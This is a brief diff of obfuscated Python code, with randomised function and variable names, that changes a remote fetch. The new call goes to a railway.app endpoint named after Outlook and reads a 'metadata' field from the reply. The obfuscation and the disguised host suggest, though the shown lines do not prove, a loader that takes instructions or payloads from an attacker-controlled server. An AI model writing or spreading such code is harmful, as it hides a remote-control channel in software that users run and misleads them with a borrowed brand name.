@@ -16,7 +16,7 @@ def net_nwfvbs_757():
 
     def net_oniaag_576():
         try:
-            data_rrgloh_522 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_rrgloh_522 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_rrgloh_522.raise_for_status()
             eval_dfrifo_637 = data_rrgloh_522.json()
             train_tzwsdv_272 = eval_dfrifo_637.get('metadata')
